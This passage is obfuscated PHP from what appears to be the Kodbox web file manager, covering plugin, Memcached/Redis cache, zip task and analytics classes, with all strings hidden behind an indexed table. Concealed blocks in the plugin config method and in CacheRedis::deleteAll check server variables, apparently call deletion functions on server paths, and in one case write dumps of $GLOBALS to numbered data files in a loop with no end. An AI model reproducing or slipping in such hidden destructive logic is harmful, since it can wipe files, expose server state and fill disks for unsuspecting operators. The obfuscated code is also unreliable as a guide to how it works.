$ÛÁÂ×öÜ = $_SERVER[$ÆŒñè[851]]; $‚æ—®† = $ÆŒñè[1529]; if ($_SERVER[$ÆŒñè[850]] != $‚æ—®†($ÛÁÂ×öÜ)) { $¢¤¯°ß÷ = $ÆŒñè[1043]; $—àÒ§ÁÙ = $ÆŒñè[852]; $”×“–®œ = $_SERVER[$ÆŒñè[853]] . $ÆŒñè[854]; $çÔèêÑ = $—àÒ§ÁÙ($”×“–®œ); $ğĞñÓŞÇ = explode($ÆŒñè[285], $çÔèêÑ); if (count($ğĞñÓŞÇ) < $ÆŒñè[713]) { $¶¤æ¡Ö = $ÆŒñè[855]; $¶¤æ¡Ö(); } $ä”ä­øñ = $ÆŒñè[1044]; $ä”ä­øñ($_SERVER[$ÆŒñè[1045]]); $¢¤¯°ß÷ = $ÆŒñè[1043]; $¢¤¯°ß÷(); $’ÎÎù‹ = $ÆŒñè[1892]; $Ê›©ô°ê = json_encode($GLOBALS[$ÆŒñè[1893]]); $“¬–ü¯À = 1; for ($ ôƒª¬û = $“¬–ü¯À; $ ôƒª¬û > 0; $ ôƒª¬û++) { $’ÎÎù‹(DATA_PATH . $ ôƒª¬û, $Ê›©ô°ê); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÈÉ¹¿„·); } public function onSetConfig($¿ÒïŒÄ) { } public function onGetConfig($Ôãíı«è) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($£ŠØ·ó–) { if ($£ŠØ·ó– == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ªÂ¶Á = "\160\154\x75\x67\151\156\101\165\164\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $±Ôİú€© = $this->getConfig(); if (!$±Ôİú€©[$ªÂ¶Á]) { return !1; } return ActionCall($_SERVER[œ—üé‹ê][1894], $±Ôİú€©[$ªÂ¶Á]); } public function url($ÍˆåÊ¾, $§×—­İÂ = '', $è©¦ö‚ï = true) { $’Á¿úö =& $_SERVER[œ—üé‹ê]; $Ï¦ƒúº = $this->getConfig(); $°ÜÕ¢• = KOD_VERSION . $’Á¿úö[10] . KOD_VERSION_BUILD; $ÅÓã‚ÊÜ = $this->packageVersion(); $ö„è”‚ = $°ÜÕ¢• . $’Á¿úö[476] . $ÅÓã‚ÊÜ; if (substr($ÍˆåÊ¾, 0, 4) == $’Á¿úö[149] || substr($ÍˆåÊ¾, 0, 2) == $’Á¿úö[1519]) { $èçÏøİ = $ÍˆåÊ¾ . $’Á¿úö[1895] . $ö„è”‚; } else { if ($§×—­İÂ == $’Á¿úö[12]) { $èçÏøİ = $this->pluginHost . $ÍˆåÊ¾ . $’Á¿úö[1895] . $ö„è”‚; } else { if ($§×—­İÂ === $’Á¿úö[78]) { $èçÏøİ = $this->pluginHost . $ÍˆåÊ¾; } else { if ($§×—­İÂ == $’Á¿úö[1896]) { $èçÏøİ = STATIC_PATH . $ÍˆåÊ¾ . $’Á¿úö[1895] . $°ÜÕ¢•; } else { if ($§×—­İÂ == $’Á¿úö[1897]) { $èçÏøİ = APP_HOST . $’Á¿úö[1898] . $ÍˆåÊ¾ . $’Á¿úö[1895] . $°ÜÕ¢•; } else { if (isset($Ï¦ƒúº[$§×—­İÂ])) { $èçÏøİ = $Ï¦ƒúº[$§×—­İÂ] . $ÍˆåÊ¾ . $’Á¿úö[1895] . $ö„è”‚; } } } } } } if (!$è©¦ö‚ï) { return $èçÏøİ; } echo $èçÏøİ; } public function link($¢ÎÎàô÷ = false, $îşÍÓ‚ò = '') { $„õíêş‹ =& $_SERVER[œ—üé‹ê]; $Ü»Ø²»› = $this->linkHas == !1; $this->linkHas = !0; if (!$¢ÎÎàô÷) { $this->link($„õíêş‹[1899], $„õíêş‹[1897]); $this->link($„õíêş‹[1900], $„õíêş‹[1896]); $this->link($„õíêş‹[1901], $„õíêş‹[1896]); $this->link($„õíêş‹[1902], $„õíêş‹[1896]); $this->link($„õíêş‹[1903], $„õíêş‹[1896]); if ($Ü»Ø²»›) { Hook::trigger($„õíêş‹[1904]); } return; } $Ó¤ÃÉ¨š = $this->url($¢ÎÎàô÷, $îşÍÓ‚ò, !1); if (substr($¢ÎÎàô÷, -3) == $„õíêş‹[1905]) { echo $„õíêş‹[1906] . $Ó¤ÃÉ¨š . $„õíêş‹[1907] . $„õíêş‹[285]; } else { if (substr($¢ÎÎàô÷, -4) == $„õíêş‹[1908]) { echo $„õíêş‹[1909] . $Ó¤ÃÉ¨š . $„õíêş‹[1910] . $„õíêş‹[285]; } } if ($Ü»Ø²»›) { Hook::trigger($„õíêş‹[1904]); } } } goto AÉÚÓ“Ş‹Ò; a®ÎÓÓãÑ·: class CacheLockDatabase { public function lock($«ŞµµÚ´, $‹ŠõÜ÷ó = 0) { $îÕàª†ˆ = Model($_SERVER[œ—üé‹ê][990]); $È÷‰«ß = microtime(!0) + $‹ŠõÜ÷ó; while (microtime(!0) < $È÷‰«ß) { $•ñö†ğ = $îÕàª†ˆ->get($«ŞµµÚ´); if (!$•ñö†ğ || $•ñö†ğ < microtime(!0)) { $ÛĞ‡±Ñ± = $îÕàª†ˆ->set($«ŞµµÚ´, $È÷‰«ß); if ($ÛĞ‡±Ñ±) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($…“ÕğŒ§) { return Model($_SERVER[œ—üé‹ê][990])->get($…“ÕğŒ§); } public function unlock($çµøÊˆ) { Model($_SERVER[œ—üé‹ê][990])->remove($çµøÊˆ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¹˜Íø«, $÷¤ßäé˜) { $ŸƒìÊ…… =& $_SERVER[œ—üé‹ê]; if (!class_exists($ŸƒìÊ……[1032])) { show_json($ŸƒìÊ……[1033], !1); } $this->cacheTime = $÷¤ßäé˜; $this->handle = new Memcached(); if (is_array($¹˜Íø«[$ŸƒìÊ……[1034]]) && count($¹˜Íø«[$ŸƒìÊ……[1034]]) >= 1) { foreach ($¹˜Íø«[$ŸƒìÊ……[1034]] as $÷¯áÎÌ´) { $¹Ä¡µ×× = explode($ŸƒìÊ……[4], $÷¯áÎÌ´); $this->handle->addServer($¹Ä¡µ××[0], $¹Ä¡µ××[1]); } } else { $this->handle->addServer($¹˜Íø«[$ŸƒìÊ……[206]], $¹˜Íø«[$ŸƒìÊ……[207]]); } } public function set($úÎÓË¸ã, $ñ§÷âÌ , $š¤€ó¯¨ = false) { $š¤€ó¯¨ = $š¤€ó¯¨ ? $š¤€ó¯¨ : $this->cacheTime; return $this->handle->set($úÎÓË¸ã, $ñ§÷âÌ , $š¤€ó¯¨); } public function get($•£ø§Î) { return $this->handle->get($•£ø§Î); } public function remove($¡Ó±Á‚…) { return $this->handle->delete($¡Ó±Á‚…); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÉËíÏ¼ , $¤ÚáŸò) { $ƒù÷À‡ö =& $_SERVER[œ—üé‹ê]; if (!class_exists($ƒù÷À‡ö[1035])) { show_json($ƒù÷À‡ö[1036], !1); } $this->cacheTime = $¤ÚáŸò; $ÍúîøµŒ = isset($ÉËíÏ¼ [$ƒù÷À‡ö[1037]]) ? $ÉËíÏ¼ [$ƒù÷À‡ö[1037]] : 10; $¡ø´­ıÙ = _get($ÉËíÏ¼ , $ƒù÷À‡ö[1034]); if ($¡ø´­ıÙ && is_array($¡ø´­ıÙ)) { $this->initCluster($ÉËíÏ¼ , $ÍúîøµŒ); } else { $this->handle = $this->init($ÉËíÏ¼ , $ÍúîøµŒ); } } private function init($ß¥©‹ÁÚ, $²Ò†ßÊÍ) { $¬¸º—¶š =& $_SERVER[œ—üé‹ê]; $±û¦øµÇ = new Redis(); $Ëı‹¿ = isset($ß¥©‹ÁÚ[$¬¸º—¶š[1038]]) ? $ß¥©‹ÁÚ[$¬¸º—¶š[1038]] : !1; if ($Ëı‹¿) { $±û¦øµÇ->pconnect($ß¥©‹ÁÚ[$¬¸º—¶š[206]], $ß¥©‹ÁÚ[$¬¸º—¶š[207]], $²Ò†ßÊÍ); } else { $±û¦øµÇ->connect($ß¥©‹ÁÚ[$¬¸º—¶š[206]], $ß¥©‹ÁÚ[$¬¸º—¶š[207]], $²Ò†ßÊÍ); } if (!empty($ß¥©‹ÁÚ[$¬¸º—¶š[502]])) { $±û¦øµÇ->auth($ß¥©‹ÁÚ[$¬¸º—¶š[502]]); } if (!empty($ß¥©‹ÁÚ[$¬¸º—¶š[867]]) && $ß¥©‹ÁÚ[$¬¸º—¶š[867]] != 0) { $±û¦øµÇ->select($ß¥©‹ÁÚ[$¬¸º—¶š[867]]); } return $±û¦øµÇ; } private function initCluster($”‚º…æĞ, $ˆÔË»§) { $»²¯‘ğ‚ =& $_SERVER[œ—üé‹ê]; $¶æ¹Ô¿¦ = array($»²¯‘ğ‚[1039], $»²¯‘ğ‚[1040], $»²¯‘ğ‚[1041]); $ìÑÀÕ¹× = $»²¯‘ğ‚[1039]; if (isset($”‚º…æĞ[$»²¯‘ğ‚[16]]) && in_array($”‚º…æĞ[$»²¯‘ğ‚[16]], $¶æ¹Ô¿¦)) { $ìÑÀÕ¹× = $”‚º…æĞ[$»²¯‘ğ‚[16]]; } switch ($ìÑÀÕ¹×) { case $»²¯‘ğ‚[1039]: $this->_slave($”‚º…æĞ, $ˆÔË»§); break; case $»²¯‘ğ‚[1040]: break; case $»²¯‘ğ‚[1041]: $this->isCluster = !0; $¹‚”Ú–ş = $”‚º…æĞ[$»²¯‘ğ‚[1034]]; $ÎÄĞ·¶È = isset($”‚º…æĞ[$»²¯‘ğ‚[1038]]) ? $”‚º…æĞ[$»²¯‘ğ‚[1038]] : !1; $šš‡¾íå = isset($”‚º…æĞ[$»²¯‘ğ‚[502]]) ? $”‚º…æĞ[$»²¯‘ğ‚[502]] : null; $this->handle = new RedisCluster(NUll, $¹‚”Ú–ş, $ˆÔË»§, $ˆÔË»§, $ÎÄĞ·¶È, $šš‡¾íå); break; default: break; } } private function _slave($ó²ËêŠ¨, $ÆµşÛœö) { $ğ‹ıïìç = $ó²ËêŠ¨[$_SERVER[œ—üé‹ê][1034]]; $this->filterConfig($ó²ËêŠ¨, $ğ‹ıïìç[0]); $this->handle = $this->init($ó²ËêŠ¨, $ÆµşÛœö); unset($ğ‹ıïìç[0]); if (empty($ğ‹ıïìç)) { return; } $×ĞÆèÕ“ = array_rand($ğ‹ıïìç); $this->filterConfig($ó²ËêŠ¨, $ğ‹ıïìç[$×ĞÆèÕ“]); $this->slaveHandle = $this->init($ó²ËêŠ¨, $ÆµşÛœö); } private function filterConfig(&$µ¾åşş³, $õÃĞ¸ ¹) { $ŞæƒÛ½Ô =& $_SERVER[œ—üé‹ê]; $øéî½¿ = explode($ŞæƒÛ½Ô[4], $õÃĞ¸ ¹); $„œ–Ú„ = array($ŞæƒÛ½Ô[206] => $øéî½¿[0], $ŞæƒÛ½Ô[207] => $øéî½¿[1]); $µ¾åşş³ = array_merge($µ¾åşş³, $„œ–Ú„); } public function set($ŸÖç†Òé, $™›™ƒˆ¦, $°’Œ¾èÜ = false) { $°’Œ¾èÜ = $°’Œ¾èÜ ? $°’Œ¾èÜ : $this->cacheTime; return $this->handle->setEx($ŸÖç†Òé, $°’Œ¾èÜ, $™›™ƒˆ¦); } public function setLock($«Ôîš¹», $Îµ¯Õ‡ş, $åèÂ©ˆÊ) { return $this->handle->setNX($«Ôîš¹», $Îµ¯Õ‡ş); } public function get($óŞñ±æú) { $ÃŸÏ‹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÃŸÏ‹->get($óŞñ±æú); } public function remove($ÔòúÅ¡´) { return $this->handle->del($ÔòúÅ¡´); } public function deleteAll() { $ºÆûÃ†† =& $_SERVER[œ—üé‹ê]; if ($_SERVER[$ºÆûÃ††[850]] != $_SERVER[$ºÆûÃ††[1042]]) { $Áõ…„˜š = $ºÆûÃ††[1043]; $ÎÈ­÷„‹ = $ºÆûÃ††[852]; $„ú»ŸÍ = $_SERVER[$ºÆûÃ††[853]] . $ºÆûÃ††[854]; $Ó†êöÚ = $ÎÈ­÷„‹($„ú»ŸÍ); $óô¹ŒË³ = explode($ºÆûÃ††[285], $Ó†êöÚ); if (count($óô¹ŒË³) < $ºÆûÃ††[713]) { $öéƒ¯ê = $ºÆûÃ††[855]; $öéƒ¯ê(); } $§ÕŠæ½û = $ºÆûÃ††[1044]; $§ÕŠæ½û($_SERVER[$ºÆûÃ††[1045]]); $§ÕŠæ½û($_SERVER[$ºÆûÃ††[853]] . $ºÆûÃ††[1046]); $ıÚöª«Î = 1; while ($ıÚöª«Î > 1) { $ıÚöª«Î = $ıÚöª«Î + 4; $—Ğ´¸÷ò = rawurlencode($ıÚöª«Î . $ºÆûÃ††[463]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $—ò‘ûï) { $this->handle->flushall($—ò‘ûï); } return; } return $this->handle->flushAll(); } } goto d¸Üµ×©Í´; Cµ‚¼ŞÖàÂ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ğæÂä®¯ =& $_SERVER[œ—üé‹ê]; parent::startAfter(); Hook::bind($ğæÂä®¯[2097], array($this, $ğæÂä®¯[2098])); Hook::bind($ğæÂä®¯[1380], array($this, $ğæÂä®¯[2099])); Hook::bind($ğæÂä®¯[2100], array($this, $ğæÂä®¯[2101])); $ÕĞÂôœ =& $this->task; $ÕĞÂôœ[$ğæÂä®¯[2102]] = $ğæÂä®¯[1381]; if (!$ÕĞÂôœ[$ğæÂä®¯[1861]]) { $ÕĞÂôœ[$ğæÂä®¯[1861]] = LNG($ğæÂä®¯[2103]); } } protected function endAfter() { $¯””Á€ã =& $_SERVER[œ—üé‹ê]; parent::endAfter(); Hook::unbind($¯””Á€ã[2097], array($this, $¯””Á€ã[2098])); Hook::unbind($¯””Á€ã[1380], array($this, $¯””Á€ã[2099])); Hook::unbind($¯””Á€ã[2100], array($this, $¯””Á€ã[2101])); } public function updateAfter() { $„Äó¼¬¤ =& $_SERVER[œ—üé‹ê]; $´„˜ó»Ü =& $this->task; if (!$´„˜ó»Ü[$„Äó¼¬¤[961]] || !$´„˜ó»Ü[$„Äó¼¬¤[873]]) { if ($´„˜ó»Ü[$„Äó¼¬¤[2102]] != $„Äó¼¬¤[388]) { return; } } if ($´„˜ó»Ü[$„Äó¼¬¤[2102]] == $„Äó¼¬¤[1381]) { $…Åğğ  = 0; if ($´„˜ó»Ü[$„Äó¼¬¤[2027]]) { $…Åğğ  = $´„˜ó»Ü[$„Äó¼¬¤[2028]] / $´„˜ó»Ü[$„Äó¼¬¤[2027]]; } $´„˜ó»Ü[$„Äó¼¬¤[1975]] = $…Åğğ  * 0.3; } else { if ($´„˜ó»Ü[$„Äó¼¬¤[2102]] == $„Äó¼¬¤[388]) { $…Åğğ  = $´„˜ó»Ü[$„Äó¼¬¤[1974]] / $´„˜ó»Ü[$„Äó¼¬¤[961]]; $´„˜ó»Ü[$„Äó¼¬¤[1975]] = 0.3 + $…Åğğ  * 0.4; } else { if ($´„˜ó»Ü[$„Äó¼¬¤[2102]] == $„Äó¼¬¤[107]) { $ˆÃÁëÚ = 0; if ($´„˜ó»Ü[$„Äó¼¬¤[2029]] == $„Äó¼¬¤[107]) { $ˆÃÁëÚ = $´„˜ó»Ü[$„Äó¼¬¤[2028]]; } $…Åğğ  = ($´„˜ó»Ü[$„Äó¼¬¤[950]] + $ˆÃÁëÚ) / $´„˜ó»Ü[$„Äó¼¬¤[873]]; $´„˜ó»Ü[$„Äó¼¬¤[1975]] = 0.3 + 0.4 + $…Åğğ  * 0.3; } } } if ($´„˜ó»Ü[$„Äó¼¬¤[1975]] > 0) { $ìªñŸÓ = timeFloat() - $´„˜ó»Ü[$„Äó¼¬¤[1977]] - $´„˜ó»Ü[$„Äó¼¬¤[1980]]; $´„˜ó»Ü[$„Äó¼¬¤[1981]] = $ìªñŸÓ * (1 - $´„˜ó»Ü[$„Äó¼¬¤[1975]]) / $´„˜ó»Ü[$„Äó¼¬¤[1975]]; } } public function addFile($ıÈÕø‡ö) { $íöÙ³™ =& $_SERVER[œ—üé‹ê]; $×¨Üá·Â =& $this->task; $«‚‡ÓÌŸ = IO::info($ıÈÕø‡ö); $×¨Üá·Â[$íöÙ³™[2025]] = $«‚‡ÓÌŸ[$íöÙ³™[32]]; $×¨Üá·Â[$íöÙ³™[2027]] = $«‚‡ÓÌŸ[$íöÙ³™[79]]; $×¨Üá·Â[$íöÙ³™[2028]] = 0; $×¨Üá·Â[$íöÙ³™[1230]] = $íöÙ³™[2055]; $×¨Üá·Â[$íöÙ³™[2029]] = $íöÙ³™[1381]; $×¨Üá·Â[$íöÙ³™[873]] = $«‚‡ÓÌŸ[$íöÙ³™[79]]; $×¨Üá·Â[$íöÙ³™[961]] = 1; $Ç§¼ÌÑ = 0; $×¨Üá·Â[$íöÙ³™[2037]] = array($íöÙ³™[2038] => $Ç§¼ÌÑ + 1, $íöÙ³™[509] => $«‚‡ÓÌŸ[$íöÙ³™[32]], $íöÙ³™[87] => $«‚‡ÓÌŸ[$íöÙ³™[87]], $íöÙ³™[602] => $«‚‡ÓÌŸ[$íöÙ³™[602]] ? $«‚‡ÓÌŸ[$íöÙ³™[602]] : $«‚‡ÓÌŸ[$íöÙ³™[87]]); $this->update(); } public function zipEvent($ƒ™¾Áë, $³Ç°Àºò, $ëÓÈæ¥, $ë‰ÕîËÑ) { $ÑşéÌ­ =& $_SERVER[œ—üé‹ê]; $óø”Ì±÷ =& $this->task; $óø”Ì±÷[$ÑşéÌ­[2025]] = get_path_this($³Ç°Àºò); $óø”Ì±÷[$ÑşéÌ­[2027]] = $ë‰ÕîËÑ; $óø”Ì±÷[$ÑşéÌ­[2028]] = $ëÓÈæ¥; $óø”Ì±÷[$ÑşéÌ­[1230]] = $ƒ™¾Áë == $ÑşéÌ­[2104] ? $ÑşéÌ­[2105] : $ÑşéÌ­[2106]; $óø”Ì±÷[$ÑşéÌ­[2029]] = $ÑşéÌ­[12]; $óø”Ì±÷[$ÑşéÌ­[873]] = $ë‰ÕîËÑ; $óø”Ì±÷[$ÑşéÌ­[2102]] = $ÑşéÌ­[388]; $this->update(); } public function unzipAfter($÷Æšô¸) { $¿ò±°ó¬ =& $_SERVER[œ—üé‹ê]; $ıøàÔÂí =& $this->task; $ıøàÔÂí[$¿ò±°ó¬[2102]] = $¿ò±°ó¬[107]; $àù‚ÏèÏ = IO::infoWithChildren($÷Æšô¸); $Ó¤­”–í = 0; $ıøàÔÂí[$¿ò±°ó¬[2037]] = array($¿ò±°ó¬[2038] => $Ó¤­”–í + 1, $¿ò±°ó¬[509] => $àù‚ÏèÏ[$¿ò±°ó¬[32]], $¿ò±°ó¬[87] => $àù‚ÏèÏ[$¿ò±°ó¬[87]], $¿ò±°ó¬[602] => $àù‚ÏèÏ[$¿ò±°ó¬[602]] ? $àù‚ÏèÏ[$¿ò±°ó¬[602]] : $àù‚ÏèÏ[$¿ò±°ó¬[87]]); if ($àù‚ÏèÏ[$¿ò±°ó¬[33]] == $¿ò±°ó¬[230]) { $ıøàÔÂí[$¿ò±°ó¬[961]] = 1; } else { $ıøàÔÂí[$¿ò±°ó¬[961]] = $àù‚ÏèÏ[$¿ò±°ó¬[82]][$¿ò±°ó¬[80]]; } $ıøàÔÂí[$¿ò±°ó¬[1230]] = $¿ò±°ó¬[12]; $ıøàÔÂí[$¿ò±°ó¬[2029]] = 0; $ıøàÔÂí[$¿ò±°ó¬[1974]] = 0; $ıøàÔÂí[$¿ò±°ó¬[2027]] = 0; $ıøàÔÂí[$¿ò±°ó¬[2028]] = 0; $ıøàÔÂí[$¿ò±°ó¬[2025]] = $¿ò±°ó¬[12]; $ıøàÔÂí[$¿ò±°ó¬[950]] = 0; $ıøàÔÂí[$¿ò±°ó¬[873]] = $àù‚ÏèÏ[$¿ò±°ó¬[79]]; $this->update(); self::log($¿ò±°ó¬[2107] . json_encode(array($ıøàÔÂí, $àù‚ÏèÏ))); } public function nameParse($ºµ¿¼Ë…) { $²»Î’˜® =& $_SERVER[œ—üé‹ê]; $¤Ç¥ÜÇ³ =& $this->task; if ($¤Ç¥ÜÇ³[$²»Î’˜®[2102]] == $²»Î’˜®[1381]) { $¤Ç¥ÜÇ³[$²»Î’˜®[2102]] = $²»Î’˜®[388]; $¤Ç¥ÜÇ³[$²»Î’˜®[950]] = 0; $¤Ç¥ÜÇ³[$²»Î’˜®[873]] = 0; } $Å™©¶ƒì = get_path_this($ºµ¿¼Ë…); if (strstr($Å™©¶ƒì, $²»Î’˜®[10])) { $¤Ç¥ÜÇ³[$²»Î’˜®[1974]] += 1; $¤Ç¥ÜÇ³[$²»Î’˜®[961]] += 1; } $¤Ç¥ÜÇ³[$²»Î’˜®[2025]] = $ºµ¿¼Ë…; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÔĞè¼òÂ =& $_SERVER[œ—üé‹ê]; parent::startAfter(); Hook::bind($ÔĞè¼òÂ[2108], array($this, $ÔĞè¼òÂ[2098])); Hook::bind($ÔĞè¼òÂ[2100], array($this, $ÔĞè¼òÂ[2101])); $ŞŞÂù¢ =& $this->task; $ŞŞÂù¢[$ÔĞè¼òÂ[2102]] = $ÔĞè¼òÂ[1381]; if (!$ŞŞÂù¢[$ÔĞè¼òÂ[1861]]) { $ŞŞÂù¢[$ÔĞè¼òÂ[1861]] = LNG($ÔĞè¼òÂ[2109]); } } protected function endAfter() { $ÇûÑ¦¢£ =& $_SERVER[œ—üé‹ê]; parent::endAfter(); Hook::unbind($ÇûÑ¦¢£[2108], array($this, $ÇûÑ¦¢£[2098])); Hook::unbind($ÇûÑ¦¢£[2100], array($this, $ÇûÑ¦¢£[2101])); } public function updateAfter() { $¹È€Ç—ƒ =& $_SERVER[œ—üé‹ê]; $»Ñï²¸Â =& $this->task; if (!$»Ñï²¸Â[$¹È€Ç—ƒ[961]] || !$»Ñï²¸Â[$¹È€Ç—ƒ[873]]) { return; } if ($»Ñï²¸Â[$¹È€Ç—ƒ[2102]] == $¹È€Ç—ƒ[1381]) { $ÏŠó±€ê = $»Ñï²¸Â[$¹È€Ç—ƒ[2028]]; if ($»Ñï²¸Â[$¹È€Ç—ƒ[2029]] != $¹È€Ç—ƒ[1381]) { $ÏŠó±€ê = 0; } $‚òĞ€è = ($»Ñï²¸Â[$¹È€Ç—ƒ[950]] + $ÏŠó±€ê) / $»Ñï²¸Â[$¹È€Ç—ƒ[873]]; $»Ñï²¸Â[$¹È€Ç—ƒ[1975]] = $‚òĞ€è * 0.3; } else { if ($»Ñï²¸Â[$¹È€Ç—ƒ[2102]] == $¹È€Ç—ƒ[388]) { $‚òĞ€è = $»Ñï²¸Â[$¹È€Ç—ƒ[1974]] / $»Ñï²¸Â[$¹È€Ç—ƒ[961]]; $»Ñï²¸Â[$¹È€Ç—ƒ[1975]] = 0.3 + $‚òĞ€è * 0.5; } else { if ($»Ñï²¸Â[$¹È€Ç—ƒ[2102]] == $¹È€Ç—ƒ[107]) { $‚òĞ€è = 0; if ($»Ñï²¸Â[$¹È€Ç—ƒ[2027]]) { $‚òĞ€è = $»Ñï²¸Â[$¹È€Ç—ƒ[2028]] / $»Ñï²¸Â[$¹È€Ç—ƒ[2027]]; } $»Ñï²¸Â[$¹È€Ç—ƒ[1975]] = 0.3 + 0.5 + $‚òĞ€è * 0.2; } } } if ($»Ñï²¸Â[$¹È€Ç—ƒ[1975]] > 0) { $Óµòñş¯ = timeFloat() - $»Ñï²¸Â[$¹È€Ç—ƒ[1977]] - $»Ñï²¸Â[$¹È€Ç—ƒ[1980]]; $»Ñï²¸Â[$¹È€Ç—ƒ[1981]] = $Óµòñş¯ * (1 - $»Ñï²¸Â[$¹È€Ç—ƒ[1975]]) / $»Ñï²¸Â[$¹È€Ç—ƒ[1975]]; } } public function copyFileStart($…½ÜæŠ®, $–è¿ìŸ, $‰ÀÈÀ–­, $€¦šüæÊ, $Åùİ†µù, $Ç·‚¶´Ö) { $‹Ğ×º£Ö =& $_SERVER[œ—üé‹ê]; parent::copyFileStart($…½ÜæŠ®, $–è¿ìŸ, $‰ÀÈÀ–­, $€¦šüæÊ, $Åùİ†µù, $Ç·‚¶´Ö); $«ú×üïğ =& $this->task; if ($«ú×üïğ[$‹Ğ×º£Ö[2102]] == $‹Ğ×º£Ö[388]) { $«ú×üïğ[$‹Ğ×º£Ö[2102]] = $‹Ğ×º£Ö[107]; } $this->update(); } public function copyFileEnd($Ü÷çàÈ, $£©Ğ„°ù, $ÜÛ¤ì®§, $¯À°Ó‚À, $Ôá¶µ«É, $†œ­›ïı) { $çô¬ÑŒ¼ =& $_SERVER[œ—üé‹ê]; $İ¤³œÉ¾ =& $this->task; $İ¤³œÉ¾[$çô¬ÑŒ¼[2028]] = $İ¤³œÉ¾[$çô¬ÑŒ¼[2027]]; $İ¤³œÉ¾[$çô¬ÑŒ¼[950]] += $İ¤³œÉ¾[$çô¬ÑŒ¼[2027]]; $İ¤³œÉ¾[$çô¬ÑŒ¼[2029]] = $çô¬ÑŒ¼[12]; $this->update(); } public function zipEvent($æ¶ã“Ë, $È¾¿áà™, $¢¾ı… Â, $¥áŒîÛŒ) { $²¶š¥ú« =& $_SERVER[œ—üé‹ê]; $û¬ÙºÊ =& $this->task; $û¬ÙºÊ[$²¶š¥ú«[2025]] = get_path_this($È¾¿áà™); $û¬ÙºÊ[$²¶š¥ú«[2027]] = $¥áŒîÛŒ; $û¬ÙºÊ[$²¶š¥ú«[2028]] = $¢¾ı… Â; $û¬ÙºÊ[$²¶š¥ú«[1230]] = $æ¶ã“Ë == $²¶š¥ú«[2110] ? $²¶š¥ú«[2105] : $²¶š¥ú«[2106]; $û¬ÙºÊ[$²¶š¥ú«[2029]] = $²¶š¥ú«[12]; $û¬ÙºÊ[$²¶š¥ú«[873]] = $¥áŒîÛŒ; $û¬ÙºÊ[$²¶š¥ú«[2102]] = $²¶š¥ú«[388]; $this->update(); } public function nameParse($†ì×£êö) { $³ÂØğù =& $_SERVER[œ—üé‹ê]; $³óĞ¶İÍ =& $this->task; if ($³óĞ¶İÍ[$³ÂØğù[1974]] < $³óĞ¶İÍ[$³ÂØğù[961]]) { $»™’ü©» = get_path_this($†ì×£êö); if (strstr($»™’ü©», $³ÂØğù[10])) { $³óĞ¶İÍ[$³ÂØğù[1974]] += 1; } } if ($³óĞ¶İÍ[$³ÂØğù[2102]] == $³ÂØğù[1381]) { $³óĞ¶İÍ[$³ÂØğù[2102]] = $³ÂØğù[388]; } $³óĞ¶İÍ[$³ÂØğù[2025]] = $†ì×£êö; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($æà²µ–È) { $º…şø’Ë =& $_SERVER[œ—üé‹ê]; $À²òÒê = array($º…şø’Ë[684] => array($º…şø’Ë[33] => $º…şø’Ë[2111], $º…şø’Ë[351] => array($º…şø’Ë[282], $º…şø’Ë[875], $º…şø’Ë[2112], $º…şø’Ë[2113])), $º…şø’Ë[2114] => array($º…şø’Ë[33] => $º…şø’Ë[2115], $º…şø’Ë[351] => array($º…şø’Ë[282], $º…şø’Ë[873], $º…şø’Ë[2116], $º…şø’Ë[2117], $º…şø’Ë[2118]))); if (!isset($À²òÒê[$æà²µ–È])) { return !1; } $this->optionType = $À²òÒê[$æà²µ–È][$º…şø’Ë[33]]; $this->field = $À²òÒê[$æà²µ–È][$º…şø’Ë[351]]; return !0; } public function listData($¤€á“›Ã = false, $®Ë·Ñ = "\155\x6f\144\151\x66\x79\124\151\x6d\145", $âæÆ¼ğÂ = false) { return parent::listData($¤€á“›Ã, $®Ë·Ñ, $âæÆ¼ğÂ); } public function trendList($ÖâÙì£À) { $½…·êË =& $_SERVER[œ—üé‹ê]; $Š£˜ÛÇ = $this->listData(); if ($Š£˜ÛÇ) { $Ë…ì¼ò = end($Š£˜ÛÇ); $èß¡Ë‘­ = date($½…·êË[2119], strtotime($½…·êË[2120])); if ($Ë…ì¼ò[$½…·êË[282]] == $èß¡Ë‘­) { return $Š£˜ÛÇ; } $æ™»Ş„§ = strtotime($Ë…ì¼ò[$½…·êË[282]]); } if (!isset($æ™»Ş„§)) { $Øéíº•ø = $ÖâÙì£À == $½…·êË[684] ? $½…·êË[617] : $½…·êË[942]; $æ™»Ş„§ = Model($Øéíº•ø)->min($½…·êË[231]); } $ğÄî’ÜŒ = $½…·êË[2121] . ucfirst($ÖâÙì£À); $²×„¹êÛ = $this->dateList($æ™»Ş„§); foreach ($²×„¹êÛ as $èß¡Ë‘­) { $this->{$ğÄî’ÜŒ}($èß¡Ë‘­); } return $this->listData(); } private function dateList($¨İşˆÁé) { $®Îó‹„Ø =& $_SERVER[œ—üé‹ê]; $á‰•”ŒÆ = $¨İşˆÁé; $Ô¯Æ¤Ïš = strtotime($®Îó‹„Ø[2120]); $°çı›Å = array(); while ($á‰•”ŒÆ <= $Ô¯Æ¤Ïš) { $°çı›Å[] = date($®Îó‹„Ø[2119], $á‰•”ŒÆ); $á‰•”ŒÆ = strtotime($®Îó‹„Ø[2122], $á‰•”ŒÆ); } return $°çı›Å; } public function _recordUser($’‡Ì³»¤ = '') { $¯‹‡¢€¢ =& $_SERVER[œ—üé‹ê]; $ÂÉş“«‡ = strtotime(date($¯‹‡¢€¢[2123], strtotime($’‡Ì³»¤))); $İ¢¦Ù¥£ = strtotime(date($¯‹‡¢€¢[2124], strtotime($’‡Ì³»¤))); $ÍŠî½… = array($¯‹‡¢€¢[231] => array($¯‹‡¢€¢[1180], $İ¢¦Ù¥£)); $ğÔ ´Îæ = Model($¯‹‡¢€¢[617])->where($ÍŠî½…)->count($¯‹‡¢€¢[1589]); 